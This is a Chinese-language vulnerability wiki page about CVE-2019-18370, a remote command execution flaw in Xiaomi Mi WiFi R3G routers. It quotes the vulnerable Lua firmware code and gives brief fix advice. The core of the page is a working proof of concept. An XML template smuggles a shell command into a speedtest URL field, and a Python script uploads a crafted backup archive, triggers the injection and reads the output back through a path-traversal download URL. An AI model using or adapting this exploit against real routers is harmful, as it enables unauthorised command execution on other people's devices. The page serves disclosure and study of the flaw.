<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/IOT%E5%AE%89%E5%85%A8/%E5%B0%8F%E7%B1%B3/%28CVE-2019-18370%29Xiaomi%20Mi%20WiFi%20R3G%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>(CVE-2019-18370)Xiaomi Mi WiFi R3G 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "(CVE-2019-18370)Xiaomi Mi WiFi R3G \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u4fee\u590d\u65b9\u6848", url: "#_4" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_5" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%E5%B0%8F%E7%B1%B3%20%E8%B7%AF%E7%94%B1%E5%99%A8%20c_upload%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-18370/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%E5%B0%8F%E7%B1%B3%20%E8%B7%AF%E7%94%B1%E5%99%A8%20c_upload%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-18370/" class="btn btn-xs btn-link">
        小米 路由器 c_upload 远程命令执行漏洞 CVE-2019-18370
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../%E5%AE%8F%E7%94%B5/%E5%AE%8F%E7%94%B5%20H8922%20%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-28151/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../%E5%AE%8F%E7%94%B5/%E5%AE%8F%E7%94%B5%20H8922%20%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-28151/" class="btn btn-xs btn-link">
        宏电 H8922 后台管理员信息泄露漏洞 CVE-2021-28151
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2019-18370xiaomi-mi-wifi-r3g">(CVE-2019-18370)Xiaomi Mi WiFi R3G 远程命令执行漏洞<a class="headerlink" href="#cve-2019-18370xiaomi-mi-wifi-r3g" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>Xiaomi Mi WiFi R3G是中国小米科技（Xiaomi）公司的一款3G路由器。 Xiaomi Mi WiFi R3G 2.28.23-stable之前版本中存在输入验证错误漏洞。该漏洞源于网络系统或产品未对输入的数据进行正确的验证。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Xiaomi Mi WiFi R3G 2.28.23-stable之前版本</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>备份文件是<code>tar.gz</code>格式的，上传后<code>tar zxf</code>解压，所以构造备份文件，可以控制解压目录的文件内容，结合测试上传下载速度功能的sh脚本执行时读取测试url列表文件，并将url部分直接进行命令拼接执行。</p>
<p>备份文件解压导致<code>/tmp/</code>目录任意文件可控</p>
<p>在<code>/usr/lib/lua/luci/controller/api/misystem.lua</code>中，配置文件功能如下</p>
<div class="highlight"><pre><span></span><code>function cUpload()
    local LuciFs = require(&quot;luci.fs&quot;)
    local XQBackup = require(&quot;xiaoqiang.module.XQBackup&quot;)
    local code = 0
    local canupload = true
    local uploadFilepath = &quot;/tmp/cfgbackup.tar.gz&quot;
    local fileSize = tonumber(LuciHttp.getenv(&quot;CONTENT_LENGTH&quot;))
    if fileSize &gt; 102400 then
        canupload = false
    end
    LuciHttp.setfilehandler(
        function(meta, chunk, eof)
            if canupload then
                if not fp then
                    if meta and meta.name == &quot;image&quot; then
                        fp = io.open(uploadFilepath, &quot;w&quot;)
                    end
                end
                if chunk then
                    fp:write(chunk)
                end
                if eof then
                    fp:close()
                end
            else
                code = 1630
            end
        end
    )
    if LuciHttp.formvalue(&quot;image&quot;) and fp then
        code = 0
    end
    local result = {}
    if code == 0 then
        local ext = XQBackup.extract(uploadFilepath)
        if ext == 0 then
            result[&quot;des&quot;] = XQBackup.getdes()
        else
            code = 1629
        end
    end
    if code ~= 0 then
        result[&quot;msg&quot;] = XQErrorUtil.getErrorMessage(code)
        LuciFs.unlink(uploadFilepath)
    end
    result[&quot;code&quot;] = code
    LuciHttp.write_json(result)
end
</code></pre></div>
<p>其中调用<code>XQBackup.extract(uploadFilepath)</code>进行解压</p>
<div class="highlight"><pre><span></span><code>-- 0:succeed
-- 1:file does not exist
-- 2:no description file
-- 3:no mbu file
function extract(filepath)
    local fs = require(&quot;nixio.fs&quot;)
    local tarpath = filepath
    if not tarpath then
        tarpath = TARMBUFILE
    end
    if not fs.access(tarpath) then
        return 1
    end
    os.execute(&quot;cd /tmp; tar -xzf &quot;..tarpath..&quot; &gt;/dev/null 2&gt;/dev/null&quot;)
    os.execute(&quot;rm &quot;..tarpath..&quot; &gt;/dev/null 2&gt;/dev/null&quot;)
    if not fs.access(DESFILE) then
        return 2
    end
    if not fs.access(MBUFILE) then
        return 3
    end
    return 0
</code></pre></div>
<p>可知，<code>/tmp</code>目录下的任意文件可控</p>
<blockquote>
<p>/usr/bin/upload_speedtest,/usr/bin/download_speedtest<code>等会读取</code>/tmp/speedtest_urls.xml`并提取url直接进行命令拼接，且这几个脚本可以通过web接口调用</p>
</blockquote>
<p>举例，查看<code>/usr/bin/download_speedtest</code>文件</p>
<div class="highlight"><pre><span></span><code>#!/usr/bin/env lua
-- ...
local cfg = {
-- ...
    [&#39;xmlfile&#39;] = &quot;/usr/share/speedtest.xml&quot;,
        [&#39;tmp_speedtest_xml&#39;] = &quot;/tmp/speedtest_urls.xml&quot;,
}
VERSION=&quot;__UNDEFINED__&quot;
-- ...
-- 测试网速使用的url文件为，若存在/tmp/speedtest_urls.xml则使用，否则用/usr/share/speedtest.xml
local filename = &quot;&quot;
filexml = io.open(cfg.tmp_speedtest_xml)
if filexml then
    filexml:close()
    filename = cfg.tmp_speedtest_xml
else
    filename = cfg.xmlfile
end

local pp = io.open(filename)
local line = pp:read(&quot;*line&quot;)
local size = 0
local resources = {}
local u = &quot;&quot;
local pids = {}
-- ...
function wget_work(url)
    local _url = url
    pid = posix.fork()
    if pid &lt; 0 then
        print(&quot;fork error&quot;)
        return -1
    elseif pid &gt; 0 then
        --print(string.format(&quot;child pid %d\n&quot;, pid))
    else
        -- 拼接命令，最终在这里执行
        os.execute(&#39;for i in $(seq &#39;.. math.floor(cfg.nr/cfg.nc) ..&#39;); do wget &#39;.. url  ..
        &quot; -q -O /dev/null; done&quot;)
    end
    return pid
end

while line do
    -- 从文件中提取url， 这里提取没有进行过滤
    local _, _, url = string.find(line,&#39;&lt;item url=&quot;(.*)&quot;/&gt;&#39;)
    if url then
        table.insert(resources, url)
    end
    line = pp:read(&quot;*line&quot;)
end
pp:close()

local urls = mrandom(1, table.getn(resources), cfg.nc)

for k, v in ipairs(urls) do
    if VERSION == &quot;LESSMEM&quot; then
        local pid = wget_work_loop(resources[v])
    else
        -- VERSION 为 __UNDEFINED__， url直接作为参数
        local pid = wget_work(resources[v])
    end
    if(pid == 0) then
        os.exit(0)
    elseif(pid == -1) then
        done()
    end
end
</code></pre></div>
<p>调用的地方貌似有好几个，其中<code>/usr/lib/lua/luci/controller/api/xqnetdetect.lua</code>中</p>
<div class="highlight"><pre><span></span><code>function netspeed()
    local XQPreference = require(&quot;xiaoqiang.XQPreference&quot;)
    local XQNSTUtil = require(&quot;xiaoqiang.module.XQNetworkSpeedTest&quot;)
    local code = 0
    local result = {}
    local history = LuciHttp.formvalue(&quot;history&quot;)
    if history then
        result[&quot;bandwidth&quot;] = tonumber(XQPreference.get(&quot;BANDWIDTH&quot;, 0, &quot;xiaoqiang&quot;))
        result[&quot;download&quot;] = tonumber(string.format(&quot;%.2f&quot;, 128 * result.bandwidth))
        result[&quot;bandwidth2&quot;] = tonumber(XQPreference.get(&quot;BANDWIDTH2&quot;, 0, &quot;xiaoqiang&quot;))
        result[&quot;upload&quot;] = tonumber(string.format(&quot;%.2f&quot;, 128 * result.bandwidth2))
    else
        os.execute(&quot;/etc/init.d/miqos stop&quot;)
        -- 这里调用了downloadSpeedTest
        local download = XQNSTUtil.downloadSpeedTest()
        if download then
            result[&quot;download&quot;] = download
            result[&quot;bandwidth&quot;] = tonumber(string.format(&quot;%.2f&quot;, 8 * download/1024))
            XQPreference.set(&quot;BANDWIDTH&quot;, tostring(result.bandwidth), &quot;xiaoqiang&quot;)
        else
            code = 1588
        end
        if code ~= 0 then
           result[&quot;msg&quot;] = XQErrorUtil.getErrorMessage(code)
        end
        os.execute(&quot;/etc/init.d/miqos start&quot;)
    end

    result[&quot;code&quot;] = code
    LuciHttp.write_json(result)
end
function downloadSpeedTest()
    local speedtest = &quot;/usr/bin/download_speedtest&quot;
    local speed
    -- 直接调用sh文件
    for _, line in ipairs(LuciUtil.execl(speedtest)) do
        if not XQFunction.isStrNil(line) and line:match(&quot;^avg rx:&quot;) then
            speed = line:match(&quot;^avg rx:(%S+)&quot;)
            if speed then
                speed = tonumber(string.format(&quot;%.2f&quot;,speed/8))
            end
            break
        end
    end
    return speed
end
</code></pre></div>
<p>所以，我们只需要构造恶意的<code>speedtest_urls.xml</code>文件，构造备份文件，上传备份文件，然后调用网络测试相关的接口，即可以实现命令注入。</p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<blockquote>
<p>template.xml</p>
</blockquote>
<div class="highlight"><pre><span></span><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;root&gt;
    &lt;class type=&quot;1&quot;&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
        &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt;
    &lt;/class&gt;
    &lt;class type=&quot;2&quot;&gt;
        &lt;item url=&quot;http://192.168.31.1 -q -O /dev/null;{command}&gt;/tmp/1.txt; exit; wget http://192.168.31.1  &quot;/&gt;
    &lt;/class&gt;
    &lt;class type=&quot;3&quot;&gt;
        &lt;item uploadurl=&quot;http://www.taobao.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.so.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.qq.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.sohu.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.tudou.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.360doc.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.kankan.com/&quot;/&gt;
        &lt;item uploadurl=&quot;http://www.speedtest.cn/&quot;/&gt;
    &lt;/class&gt;
&lt;/root&gt;
</code></pre></div>
<blockquote>
<p>remote_command_execution_vulnerability.py</p>
</blockquote>
<div class="highlight"><pre><span></span><code>import os
import tarfile
import requests

# proxies = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}
proxies = {}

## get stok
stok = input(&quot;stok: &quot;)

## make config file
command = input(&quot;command: &quot;)
speed_test_filename = &quot;speedtest_urls.xml&quot;
with open(&quot;template.xml&quot;,&quot;rt&quot;) as f:
    template = f.read()
data = template.format(command=command)
# print(data)
with open(&quot;speedtest_urls.xml&quot;,&#39;wt&#39;) as f:
    f.write(data)

with tarfile.open(&quot;payload.tar.gz&quot;, &quot;w:gz&quot;) as tar:
    # tar.add(&quot;cfg_backup.des&quot;)
    # tar.add(&quot;cfg_backup.mbu&quot;)
    tar.add(&quot;speedtest_urls.xml&quot;)

## upload config file
print(&quot;start uploading config file ...&quot;)
r1 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/;stok={}/api/misystem/c_upload&quot;.format(stok), files={&quot;image&quot;:open(&quot;payload.tar.gz&quot;,&#39;rb&#39;)}, proxies=proxies)
# print(r1.text)

## exec download speed test, exec command
print(&quot;start exec command...&quot;)
r2 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed&quot;.format(stok), proxies=proxies)
# print(r2.text)

## read result file
r3 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt&quot;, proxies=proxies)
if r3.status_code == 200:
    print(&quot;success, vul&quot;)
    print(r3.text)
</code></pre></div>
<p><a href="https://www.ol4three.com/2020/09/12/IOT/Exploit/小米/CVE-2019-18370-Xiaomi-Mi-WiFi-R3G-远程命令执行漏洞/image-20200904223817264.png"><img alt="image-20200904223817264" src="../resource/%28CVE-2019-18370%29Xiaomi%20Mi%20WiFi%20R3G%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/image-20200904223817264.png" /></a></p>
<p><a href="https://www.ol4three.com/2020/09/12/IOT/Exploit/小米/CVE-2019-18370-Xiaomi-Mi-WiFi-R3G-远程命令执行漏洞/image-20200904223817264.png">image-20200904223817264</a></p>
<h2 id="_4">修复方案<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<ol>
<li>将备份文件格式修改为特定格式，直接读取备份文件内容，而不需使用解压</li>
<li>从<code>speedtest_urls.xml</code>中读取urls时，进行必要的过滤，防止命令注入</li>
</ol>
<h2 id="_5">参考链接<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md">https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/report/report.md</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%E5%B0%8F%E7%B1%B3%20%E8%B7%AF%E7%94%B1%E5%99%A8%20c_upload%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-18370/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%E5%B0%8F%E7%B1%B3%20%E8%B7%AF%E7%94%B1%E5%99%A8%20c_upload%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2019-18370/" class="btn btn-xs btn-link">
        小米 路由器 c_upload 远程命令执行漏洞 CVE-2019-18370
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../%E5%AE%8F%E7%94%B5/%E5%AE%8F%E7%94%B5%20H8922%20%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-28151/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../%E5%AE%8F%E7%94%B5/%E5%AE%8F%E7%94%B5%20H8922%20%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-28151/" class="btn btn-xs btn-link">
        宏电 H8922 后台管理员信息泄露漏洞 CVE-2021-28151
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>